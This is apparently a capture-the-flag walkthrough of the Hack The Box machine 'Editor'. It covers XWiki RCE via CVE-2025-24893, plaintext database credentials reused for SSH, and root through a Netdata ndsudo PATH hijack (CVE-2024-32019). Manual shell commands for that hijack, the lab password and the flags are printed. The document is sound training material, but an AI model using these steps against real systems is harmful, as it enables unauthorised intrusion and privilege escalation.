# Editor - Hack The Box  

<img src="meme.png" alt="Cerberus Emoji" width="550"/>

## Overview
**Editor** is an Easy difficulty Linux machine on Hack The Box that demonstrates exploitation of a vulnerable web service (XWiki), credential discovery, and privilege escalation through a Netdata misconfiguration.  
The attack chain highlights real-world issues such as outdated software (CVE-2025-24893) and insecure `PATH` handling (CVE-2024-32019).

## Enumeration
1. **Nmap Scan**
```bash
nmap -sCV -p- editor.htb
```
![Nmap Scan](picture2.png)

   - Open ports: `22 (SSH)`, `80 (HTTP)`, `8080 (XWiki)`
   - Web service: XWiki 15.10.8 detected.

2. **Host File Configuration**

This allowed me to access the website directly by visiting http://editor.htb.

2. **Web Enumeration**
- Accessing `http://editor.htb:80` reveals a futuristic code editor website. 
- Not sure anything interesting here after going through the website, let's move on to the next website.

- Accessing `http://editor.htb:8080` reveals an **XWiki** login portal.
- Version check shows it is vulnerable to RCE.

## Exploitation

### Step 1 ‚Äì XWiki RCE (Foothold)
- Vulnerability: **CVE-2025-24893**
- Exploit: Remote Code Execution via crafted payload.
- Public PoC available (e.g., [dollarboysushil/CVE-2025-24893](https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC)).
- Result: Reverse shell obtained as user **`xwiki`**.

Trying to access the home folder, we been restricted from accessing the **oliver** directory as we does not have the permission as user **oliver**.

Now for **initial step** to gain the escalated priviledge, let's download **linpeas.sh** from my machine into the server.

![Full Port Scan](picture13.png)

Let's run the linpeas.sh to scan through the server to find **vulnerabilities**.

Now, there is a section displayed in the linpeas.sh that reveal the locations that might be interesting to find the **potential credentials**.

### Step 2 ‚Äì Credential Discovery
- Inside `/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml`, credentials are stored in plaintext:
```xml
<property name="connection.username">oliver</property>
<property name="connection.password">theEd1t0rTeam99</property>
```

![Full Port Scan](picture18.png)

- SSH with these credentials:
  ```bash
  ssh oliver@editor.htb
  ```
- User flag obtained: `user.txt`.

**User Flag:** `f3314c85e144f791a8a5e0fc31c67118`

## Privilege Escalation

### Step 3 ‚Äì Netdata PATH Hijack
- Local service: **Netdata** running on port `19999`.
- Binary: `/usr/bin/ndsudo` (SUID root).
- Issue: Trusts the `PATH` environment ‚Üí vulnerable to **CVE-2024-32019**.

#### Automated Exploitation:

![Full Port Scan](picture22.png)

Let's clone the repo and compile the binary first in my machine before transfering it to the victim's server.

![Full Port Scan](picture23.png)

After downloading it into the server, we need to hijack the path to the original nvme binary file to our malicious nvme binary file (in tmp).

![Full Port Scan](picture24.png)

Let's use the `-h option` to see how to run the ndsudo file.

Here the interesting part:

- For `nvme` we have 2 command:
1. nvme-list 
2. nvme-smart-log 

- For `megacli` we have 2 command:
1. megacli-disk-info
2. megacli-battery-info 

- For `arcconf` we have 2 command:
1. arcconf-ld-info
2. arcconf-pd-info

![Full Port Scan](picture27.png)

Now, because we created the malicious named **nvme**, let's run the ndsudo with the command **nvme-list**.

Lets gooo!!! We've got the **Root permission**!

![Full Port Scan](picture25.png)

**Root Flag:** `db0284a56b422ffbac5aff84badac070`

#### Alternate Manual Exploitation:
1. Create a malicious binary:
   ```bash
   echo '/bin/bash -p' > nvme
   chmod +x nvme
   ```
2. Prepend current directory to `PATH`:
   ```bash
   export PATH=.:$PATH
   ```
3. Execute:
   ```bash
   ndsudo nvme-list
   ```
4. Root shell obtained.  
   Read the root flag: `root.txt`.
